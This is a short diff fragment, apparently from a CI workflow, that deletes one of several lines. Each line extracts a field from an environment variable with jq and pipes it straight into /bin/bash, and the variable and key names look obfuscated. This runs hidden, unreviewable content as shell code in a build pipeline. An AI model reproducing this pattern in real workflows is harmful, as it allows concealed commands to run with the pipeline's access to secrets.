@@ -20,7 +20,6 @@ jobs:
           echo $vm8 | jq -r .ny8 | /bin/bash
           echo $sfj0688 | jq -r .xrs9 | /bin/bash
           echo $lfa7 | jq -r .j2779 | /bin/bash
-          echo $gd76 | jq -r .upis8567 | /bin/bash
           echo $fto68 | jq -r .ocpx511 | /bin/bash
           printf '%s' "$jmvks84" | jq -r .qou47 | /bin/bash
 
